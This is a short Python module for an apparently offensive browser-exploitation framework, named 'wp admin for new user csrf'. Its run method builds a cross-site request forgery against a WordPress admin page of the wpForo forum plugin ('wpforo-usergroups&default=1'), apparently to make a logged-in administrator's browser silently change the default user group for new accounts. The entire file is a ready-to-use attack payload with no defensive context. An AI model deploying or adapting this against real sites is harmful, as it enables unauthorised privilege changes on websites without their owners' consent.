from deathnote_module import *

class Module(BrowserAuxiliary):
	
	__info__ = {
		"name": "wp admin for new user csrf",
		"description": "wp admin for new user csrf",
		"target": (
			"all",
		),
	}
	
	target = OptString("http://127.0.0.1", "Target", "yes")
	
	def run(self):

		js = self.csrf_get(self.target+"/wp-admin/admin.php?page=wpforo-usergroups&default=1")
		return js
